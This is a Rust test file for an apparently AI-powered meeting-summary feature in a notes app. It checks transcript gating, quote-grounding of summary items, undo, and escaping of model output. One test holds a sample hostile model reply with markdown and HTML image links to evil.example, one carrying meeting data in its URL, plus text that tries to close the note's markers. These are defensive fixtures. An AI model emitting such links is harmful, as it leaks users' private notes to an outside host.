use super::*;
use crate::recording_note::{Segment, TRANSCRIPT_CLOSE, render_transcript};
use kanso_ai::tidy::{Action, Quoted};
use proptest::prelude::*;
use proptest::test_runner::{Config, RngAlgorithm, RngSeed};

const FILE: &str = "file:abc123";

fn store() -> (tempfile::TempDir, Store) {
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(dir.path().join("kanso.db")).unwrap();
    store
        .role_book(kanso_core::roles::Role::Inbox, Origin::Ui)
        .unwrap();
    (dir, store)
}

fn seg(start_secs: u32, text: &str) -> Segment {
    Segment {
        start_secs,
        text: text.into(),
        speaker: None,
    }
}

fn meeting_body() -> String {
    let transcript = render_transcript(
        FILE,
        &[
            seg(0, "We started with the roadmap. Priya is taking the beta."),
            seg(
                22,
                "The beta is on track for the sixth, so ship it on the sixth.",
            ),
            seg(47, "Priya will send the onboarding draft by the thirtieth."),
        ],
    )
    .unwrap();
    format!("# Meeting — 23 Oct 2026\n\n[Audio · 1 min](inkdrop://{FILE})\n\n{transcript}")
}

fn note(store: &Store, body: &str, extra: serde_json::Value) -> String {
    let mut doc = json!({"title": "Meeting — 23 Oct 2026", "body": body, "bookId": "book:inbox"});
    for (key, value) in extra.as_object().cloned().unwrap_or_default() {
        doc[key] = value;
    }
    store
        .put(DocType::Note, doc, Put::Upsert, Origin::Ui)
        .unwrap()
        .id
}

fn lock(store: &Store, id: &str) {
    store
        .put(
            DocType::Note,
            json!({"_id": id, "kansoLock": {"salt": "abc"}}),
            Put::Merge,
            Origin::Sync,
        )
        .unwrap();
}

fn reply() -> Tidy {
    Tidy {
        summary: vec!["The beta ships on the sixth.".into()],
        decisions: vec![
            Quoted {
                text: "Ship the beta on the 6th".into(),
                quotes: vec!["ship it on the sixth".into()],
            },
            Quoted {
                text: "Invented".into(),
                quotes: vec!["nobody said this".into()],
            },
        ],
        actions: vec![
            Action {
                text: "Send the onboarding draft".into(),
                who: Some("Priya".into()),
                when: Some("by the 30th".into()),
                quotes: vec!["send the onboarding draft".into()],
            },
            Action {
                text: "No quote".into(),
                who: None,
                when: None,
                quotes: vec![],
            },
        ],
        ..Tidy::default()
    }
}

fn all(draft: &SummaryDraft) -> BTreeSet<usize> {
    (0..draft.actions.len()).collect()
}

#[test]
fn the_source_is_the_transcript_with_its_times() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    assert_eq!(source.file_id, FILE);
    assert_eq!(source.segments.len(), 3);
    assert!(source.prompt_text.starts_with("[00:00] We started"));
    assert!(source.prompt_text.contains("\n\n[00:22] The beta"));
    assert!(
        !source.prompt_text.contains("kanso-audio"),
        "no links go out"
    );
    assert!(
        !source.prompt_text.contains("inkdrop"),
        "no file ids go out"
    );
    assert!(source.words > 20);
    assert!(!source.replaces);
}

#[test]
fn only_a_note_with_a_transcript_that_may_be_sent_is_read() {
    let (_dir, store) = store();
    let plain = note(&store, "Just words.", json!({}));
    assert!(matches!(
        summary_source(&store, &plain),
        Err(SummaryError::NoTranscript)
    ));
    assert!(matches!(
        summary_source(&store, "note:nope"),
        Err(SummaryError::Missing)
    ));
    let locked = note(&store, &meeting_body(), json!({}));
    lock(&store, &locked);
    assert!(matches!(
        summary_source(&store, &locked),
        Err(SummaryError::KeptOut)
    ));
    let trashed = note(&store, &meeting_body(), json!({}));
    store
        .put(
            DocType::Note,
            json!({"_id": trashed, "bookId": kanso_core::model::TRASH_BOOK_ID}),
            Put::Merge,
            Origin::Ui,
        )
        .unwrap();
    assert!(matches!(
        summary_source(&store, &trashed),
        Err(SummaryError::KeptOut)
    ));
    let excluded = note(&store, &meeting_body(), json!({}));
    let tag = store
        .put(
            DocType::Tag,
            json!({"name": "ai-exclude"}),
            Put::Upsert,
            Origin::Ui,
        )
        .unwrap()
        .id;
    store
        .put(
            DocType::Note,
            json!({"_id": excluded, "tags": [tag]}),
            Put::Merge,
            Origin::Ui,
        )
        .unwrap();
    assert!(matches!(
        summary_source(&store, &excluded),
        Err(SummaryError::KeptOut)
    ));
}

#[test]
fn a_locked_note_is_refused_when_the_write_comes_too() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    // Locked while the model worked.
    lock(&store, &id);
    let got = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui);
    assert!(matches!(got, Err(SummaryError::KeptOut)));
}

#[test]
fn items_without_a_quote_in_the_transcript_are_dropped() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    assert_eq!(draft.decisions.len(), 1);
    assert_eq!(draft.actions.len(), 1);
    assert_eq!(draft.dropped, 2);
    assert_eq!(draft.decisions[0].moment, 22);
    assert_eq!(draft.actions[0].moment, 47);
    assert_eq!(draft.overview.len(), 1);
}

#[test]
fn a_time_in_brackets_is_not_a_quote() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let tidy = Tidy {
        decisions: vec![Quoted {
            text: "Made up".into(),
            quotes: vec!["00 22 00 47".into()],
        }],
        ..Tidy::default()
    };
    assert!(ground(&source, &tidy).decisions.is_empty());
}

#[test]
fn the_summary_goes_above_the_transcript_and_matches_the_design() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    let applied = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
    assert!(!applied.replaced);
    let body = store.note(&id).unwrap().unwrap().body;
    assert!(body.contains("## Summary\n\n- The beta ships on the sixth."));
    assert!(body.contains("- Ship the beta on the 6th ([00:22](kanso-audio://file:abc123?t=22))"));
    assert!(body.contains(
        "- [ ] Send the onboarding draft — Priya, by the 30th ([00:47](kanso-audio://file:abc123?t=47))"
    ));
    let summary_at = body.find(SUMMARY_OPEN).unwrap();
    let transcript_at = body.find(TRANSCRIPT_OPEN).unwrap();
    assert!(summary_at < transcript_at, "above the transcript");
    assert!(body.starts_with("# Meeting — 23 Oct 2026\n\n[Audio"));
    // The transcript is still found, whole.
    assert!(transcript_range(&body, FILE).is_some());
    // One step brings it back.
    assert_eq!(applied.edit.undo["body"], meeting_body());
}

#[test]
fn a_second_summary_replaces_the_first_and_nothing_else() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
    // The person writes around it.
    let mut body = store.note(&id).unwrap().unwrap().body;
    body.push_str("\n\nMy own afterthought.");
    store
        .put(
            DocType::Note,
            json!({"_id": id, "body": body}),
            Put::Merge,
            Origin::Ui,
        )
        .unwrap();
    assert!(summary_source(&store, &id).unwrap().replaces);
    let mut again = draft.clone();
    again.overview = vec!["A new point.".into()];
    let applied = apply_summary(&store, &id, &again, &BTreeSet::new(), Origin::Ui).unwrap();
    assert!(applied.replaced);
    let body = store.note(&id).unwrap().unwrap().body;
    assert_eq!(body.matches(SUMMARY_OPEN).count(), 1);
    assert!(body.contains("A new point."));
    assert!(!body.contains("The beta ships on the sixth."));
    assert!(!body.contains("- [ ]"), "no ticked items, none written");
    assert!(body.ends_with("My own afterthought."));
}

#[test]
fn only_the_ticked_action_items_are_written() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    let none = render_summary(&draft, &BTreeSet::new()).unwrap();
    assert!(!none.contains("Action items"));
    assert!(none.contains("## Decisions"));
    let empty = SummaryDraft {
        file_id: FILE.into(),
        ..SummaryDraft::default()
    };
    assert_eq!(render_summary(&empty, &BTreeSet::new()), None);
    let got = apply_summary(&store, &id, &empty, &BTreeSet::new(), Origin::Ui);
    assert!(matches!(got, Err(SummaryError::Empty)));
}

#[test]
fn a_note_changed_under_the_write_is_refused_not_overwritten() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let source = summary_source(&store, &id).unwrap();
    let draft = ground(&source, &reply());
    // The transcript is gone: nowhere to put it.
    let gone = meeting_body().replace(TRANSCRIPT_CLOSE, "");
    store
        .put(
            DocType::Note,
            json!({"_id": id, "body": gone}),
            Put::Merge,
            Origin::Ui,
        )
        .unwrap();
    let got = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui);
    assert!(matches!(got, Err(SummaryError::NoTranscript)));
    let after = store.note(&id).unwrap().unwrap().body;
    assert!(!after.contains(SUMMARY_OPEN));
}

// no-prop-test: one notebook locked between the read and the write.
#[test]
fn a_note_in_a_locked_notebook_is_refused_before_and_at_apply() {
    let (_dir, store) = store();
    let book = store
        .put(
            DocType::Book,
            json!({"name": "Private"}),
            Put::Upsert,
            Origin::Ui,
        )
        .unwrap()
        .id;
    let id = note(&store, &meeting_body(), json!({"bookId": book}));
    let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
    store
        .put(
            DocType::Book,
            json!({"_id": book, "kansoLock": {"salt": "abc"}}),
            Put::Merge,
            Origin::Sync,
        )
        .unwrap();
    assert!(matches!(
        summary_source(&store, &id),
        Err(SummaryError::KeptOut)
    ));
    let before = store.note(&id).unwrap().unwrap().body;
    let got = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui);
    assert!(matches!(got, Err(SummaryError::KeptOut)));
    assert_eq!(store.note(&id).unwrap().unwrap().body, before);
}

/// A sealed note (#287 seals a locked note's transcript) is refused on the
/// lock alone, whatever its body holds: nothing of it is read for sending.
// no-prop-test: one sealed note.
#[test]
fn a_sealed_recording_is_never_read() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    store
        .put(
            DocType::Note,
            json!({"_id": id, "kansoLock": {"v": 1, "salt": "c2FsdA", "data": "sealed"}}),
            Put::Merge,
            Origin::Sync,
        )
        .unwrap();
    assert!(matches!(
        summary_source(&store, &id),
        Err(SummaryError::KeptOut)
    ));
}

/// A reply written to hurt: items whose only quote is the title or another
/// recording's words, and text that tries to fetch, to inject HTML or to
/// close the markers. None of it reaches the note as such.
// no-prop-test: one adversarial reply, read item by item.
#[test]
fn a_hostile_reply_is_dropped_or_defused() {
    let (_dir, store) = store();
    let other = render_transcript(
        "file:other9",
        &[seg(0, "The secret budget figure is forty million.")],
    )
    .unwrap();
    let body = format!("{}\n\n{other}", meeting_body());
    let id = note(&store, &body, json!({}));
    let source = summary_source(&store, &id).unwrap();
    assert_eq!(source.recordings, 2);
    assert!(
        !source.prompt_text.contains("forty million"),
        "only the first recording goes"
    );
    let tidy = Tidy {
        summary: vec![
            "Look ![x](https://evil.example/c?q=sixth) here".into(),
            "<img src=https://evil.example/p> <!-- /kanso:summary --> tail".into(),
        ],
        decisions: vec![
            Quoted {
                text: "From the title".into(),
                quotes: vec!["Meeting — 23 Oct 2026".into()],
            },
            Quoted {
                text: "From the other recording".into(),
                quotes: vec!["secret budget figure".into()],
            },
        ],
        actions: vec![Action {
            text: "Send ![t](//evil.example/x.png) the draft".into(),
            who: Some("<b>Priya</b>".into()),
            when: None,
            quotes: vec!["send the onboarding draft".into()],
        }],
        ..Tidy::default()
    };
    let draft = ground(&source, &tidy);
    assert!(draft.decisions.is_empty(), "{:?}", draft.decisions);
    assert_eq!(draft.dropped, 2);
    assert_eq!(draft.actions.len(), 1);
    apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
    let after = store.note(&id).unwrap().unwrap().body;
    assert!(!after.contains("evil.example/c"), "{after}");
    assert!(!after.contains("//evil.example/x.png"), "{after}");
    // Raw HTML is shown as text: every `<` in the block but our markers'
    // is escaped.
    let block = &after[summary_range(&after).unwrap()];
    let inner = &block[SUMMARY_OPEN.len()..block.len() - SUMMARY_CLOSE.len()];
    for (at, _) in inner.match_indices('<') {
        assert_eq!(&inner[at - 1..at], "\\", "{inner}");
    }
    assert!(inner.contains("\\<img"), "{inner}");
    assert_eq!(after.matches(SUMMARY_CLOSE).count(), 1);
    assert!(transcript_range(&after, FILE).is_some());
    assert!(transcript_range(&after, "file:other9").is_some());
}

// no-prop-test: one note with two recordings, one with one.
#[test]
fn several_recordings_say_which_is_sent() {
    use kanso_ai::Provider;
    let (_dir, store) = store();
    let other = render_transcript("file:other9", &[seg(0, "Second meeting words.")]).unwrap();
    let id = note(&store, &format!("{}\n\n{other}", meeting_body()), json!({}));
    let source = summary_source(&store, &id).unwrap();
    assert_eq!(source.file_id, FILE);
    let words = send_words(&source, Provider::OpenAi, "https://api.openai.com/v1", None);
    assert!(
        words.contains("This note has 2 recordings: only the first one's transcript is sent."),
        "{words}"
    );
    let one = summary_source(&store, &note(&store, &meeting_body(), json!({}))).unwrap();
    let words = send_words(&one, Provider::OpenAi, "https://api.openai.com/v1", None);
    assert!(!words.contains("recordings"), "{words}");
}

// no-prop-test: one transcript past the cap, one under it.
#[test]
fn a_transcript_past_the_cap_says_so_before_send() {
    use kanso_ai::Provider;
    let (_dir, store) = store();
    let segments: Vec<Segment> = (0..3_000)
        .map(|ix| {
            seg(
                ix * 20,
                &"words said in this stretch of the meeting ".repeat(2),
            )
        })
        .collect();
    let transcript = render_transcript(FILE, &segments).unwrap();
    let id = note(&store, &transcript, json!({}));
    let source = summary_source(&store, &id).unwrap();
    assert!(source.cut);
    let all_words = source.said.split_whitespace().count();
    assert!(source.words < all_words, "{} < {all_words}", source.words);
    let words = send_words(
        &source,
        Provider::LocalModel,
        "http://127.0.0.1:11434/v1",
        None,
    );
    assert!(words.contains("only its first part is sent"), "{words}");
    let short = summary_source(&store, &note(&store, &meeting_body(), json!({}))).unwrap();
    assert!(!short.cut);
}

/// Undo puts the note back, and never over what was typed after Apply.
// no-prop-test: one apply, then one edit; `batch` has the undo properties.
#[test]
fn undo_brings_the_note_back_and_never_over_later_typing() {
    let (_dir, store) = store();
    let id = note(&store, &meeting_body(), json!({}));
    let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
    let applied = apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
    let current = serde_json::to_value(store.note(&id).unwrap().unwrap()).unwrap();
    let back = crate::batch::undo_stamped(&applied.edit.change, &applied.edit.undo, &current, 1)
        .expect("an untouched note is put back");
    assert_eq!(back["body"], meeting_body());
    let mut typed = store.note(&id).unwrap().unwrap().body;
    typed.push_str("\n\nTyped after Apply.");
    store
        .put(
            DocType::Note,
            json!({"_id": id, "body": typed}),
            Put::Merge,
            Origin::Ui,
        )
        .unwrap();
    let current = serde_json::to_value(store.note(&id).unwrap().unwrap()).unwrap();
    assert!(
        crate::batch::undo_stamped(&applied.edit.change, &applied.edit.undo, &current, 2).is_none(),
        "later typing is not undone away"
    );
}

// no-prop-test: three fixed backends, each read for what it must say.
#[test]
fn the_sheet_names_the_destination_and_what_stays() {
    use kanso_ai::Provider;
    let keyed = send_line(1_240, Provider::OpenAi, "https://api.openai.com/v1", None);
    assert!(keyed.contains("(1240 words)"), "{keyed}");
    assert!(keyed.contains("to api.openai.com?"), "{keyed}");
    assert!(keyed.contains("The audio is not sent. The transcript is."));
    assert!(keyed.contains("retention rules"));
    let local = send_line(1, Provider::LocalModel, "http://10.0.0.2:11434/v1", None);
    assert!(local.contains("(1 word)") && local.contains("the model at 10.0.0.2:11434"));
    assert!(local.contains("only to that model"));
    let agent = send_line(50, Provider::OpenAi, "", Some("Claude Code"));
    assert!(
        agent.contains("to Claude Code on this computer?"),
        "{agent}"
    );
    assert!(agent.contains("own provider"));
}

fn props() -> Config {
    Config {
        cases: 128,
        rng_seed: RngSeed::Fixed(0x0073_756d_6d72),
        rng_algorithm: RngAlgorithm::ChaCha,
        failure_persistence: None,
        ..Config::default()
    }
}

proptest! {
    #![proptest_config(props())]

    /// A quote copied from a paragraph is linked to that paragraph's start,
    /// whichever paragraph it is.
    #[test]
    fn prop_a_quote_links_to_the_paragraph_it_came_from(
        gaps in prop::collection::vec(1u32..90, 2..8),
        pick in 0usize..8,
    ) {
        let mut at = 0;
        let mut segments = Vec::new();
        for (ix, gap) in gaps.iter().enumerate() {
            segments.push(seg(at, &format!("alpha{ix}x bravo{ix}y charlie{ix}z delta{ix}w")));
            at += gap;
        }
        let block = render_transcript(FILE, &segments).unwrap();
        let (parsed, said) = segments_of(&block);
        let source = SummarySource {
            id: "note:x".into(),
            title: String::new(),
            file_id: FILE.into(),
            date: None,
            prompt_text: prompt_text(&parsed),
            words: said.split_whitespace().count(),
            segments: parsed,
            said,
            replaces: false,
            cut: false,
            recordings: 1,
        };
        let ix = pick % segments.len();
        let quote = format!("bravo{ix}y charlie{ix}z");
        let tidy = Tidy {
            decisions: vec![Quoted { text: "d".into(), quotes: vec![quote] }],
            ..Tidy::default()
        };
        let draft = ground(&source, &tidy);
        prop_assert_eq!(draft.decisions.len(), 1);
        prop_assert_eq!(draft.decisions[0].moment, segments[ix].start_secs);
    }

    /// Whatever words the model gives, the block has our markers once, each
    /// item is one line, and the transcript around it is found again.
    #[test]
    fn prop_a_summary_cannot_break_the_note(
        points in prop::collection::vec(".{0,80}", 0..4),
        who in proptest::option::of(".{1,20}"),
        text in ".{1,80}",
        ticked in any::<bool>(),
    ) {
        let draft = SummaryDraft {
            file_id: FILE.into(),
            overview: points.iter().map(|p| one_line(p, ITEM_MAX)).filter(|p| !p.is_empty()).collect(),
            decisions: vec![SummaryItem {
                text: one_line(&text, ITEM_MAX),
                who: None,
                when: None,
                moment: 22,
            }],
            actions: vec![SummaryItem {
                text: one_line(&text, ITEM_MAX),
                who: who.as_ref().map(|w| one_line(w, 80)),
                when: None,
                moment: 47,
            }],
            ..SummaryDraft::default()
        };
        prop_assume!(!draft.decisions[0].text.is_empty());
        let keep: BTreeSet<usize> = if ticked { [0].into() } else { BTreeSet::new() };
        let block = render_summary(&draft, &keep).unwrap();
        prop_assert_eq!(block.matches(SUMMARY_OPEN).count(), 1);
        prop_assert_eq!(block.matches(SUMMARY_CLOSE).count(), 1);
        prop_assert_eq!(block.matches(TRANSCRIPT_OPEN).count(), 0);
        // The model's words are never raw HTML or an image.
        let inner = &block[SUMMARY_OPEN.len()..block.len() - SUMMARY_CLOSE.len()];
        for (at, _) in inner.match_indices('<').chain(inner.match_indices("![")) {
            // Escaped: an odd run of backslashes before it.
            let run = inner[..at].chars().rev().take_while(|c| *c == '\\').count();
            prop_assert!(run % 2 == 1, "{}", inner);
        }
        let body = meeting_body();
        let (out, replaced) = put_summary(&body, FILE, &block).unwrap();
        prop_assert!(!replaced);
        prop_assert!(summary_range(&out).is_some());
        let range = transcript_range(&out, FILE).expect("the transcript survives");
        let original = transcript_range(&body, FILE).unwrap();
        prop_assert_eq!(&out[range], &body[original]);
        // Putting it again swaps it in place and keeps the rest.
        let (twice, replaced) = put_summary(&out, FILE, &block).unwrap();
        prop_assert!(replaced);
        prop_assert_eq!(twice, out);
    }

    /// Whatever the person, a sync or another device writes around the
    /// transcript while the review is open, Apply keeps every word of it:
    /// the summary goes into the note as it is now, against its revision.
    #[test]
    fn prop_edits_made_during_review_are_kept(
        before in "[a-zA-Z .\n]{0,60}",
        after in "[a-zA-Z .\n]{0,60}",
    ) {
        let (_dir, store) = store();
        let id = note(&store, &meeting_body(), json!({}));
        let draft = ground(&summary_source(&store, &id).unwrap(), &reply());
        let edited = format!("{before}{}{after}", meeting_body());
        store
            .put(DocType::Note, json!({"_id": id, "body": edited}), Put::Merge, Origin::Sync)
            .unwrap();
        apply_summary(&store, &id, &draft, &all(&draft), Origin::Ui).unwrap();
        let out = store.note(&id).unwrap().unwrap().body;
        let range = summary_range(&out).unwrap();
        let mut without = out.clone();
        without.replace_range(range, "");
        let squash = |t: &str| t.split_whitespace().collect::<Vec<_>>().join(" ");
        prop_assert_eq!(squash(&without), squash(&edited));
    }

    /// Whatever markup the model writes, an item is shown as words: no `<`
    /// and no `![` it gives survives unescaped.
    #[test]
    fn prop_model_words_are_never_markup(text in r"[a-z<>!\[\]()\\ :/.]{1,60}") {
        let line = md_line(&text, ITEM_MAX);
        for (at, _) in line.match_indices('<').chain(line.match_indices("![")) {
            let run = line[..at].chars().rev().take_while(|c| *c == '\\').count();
            prop_assert!(run % 2 == 1, "{} -> {}", text, line);
        }
    }

    /// An item the transcript does not back never reaches the note.
    #[test]
    fn prop_an_unbacked_item_is_never_written(quote in "[qxz]{4,12}") {
        let block = render_transcript(FILE, &[seg(0, "hello there everyone"), seg(30, "all good")]).unwrap();
        let (segments, said) = segments_of(&block);
        let source = SummarySource {
            id: "note:x".into(),
            title: String::new(),
            file_id: FILE.into(),
            date: None,
            prompt_text: prompt_text(&segments),
            words: 5,
            segments,
            said,
            replaces: false,
            cut: false,
            recordings: 1,
        };
        let tidy = Tidy {
            decisions: vec![Quoted { text: "d".into(), quotes: vec![quote.clone()] }],
            actions: vec![Action { text: "a".into(), who: None, when: None, quotes: vec![quote] }],
            ..Tidy::default()
        };
        let draft = ground(&source, &tidy);
        prop_assert!(draft.decisions.is_empty() && draft.actions.is_empty());
        prop_assert_eq!(draft.dropped, 2);
    }
}
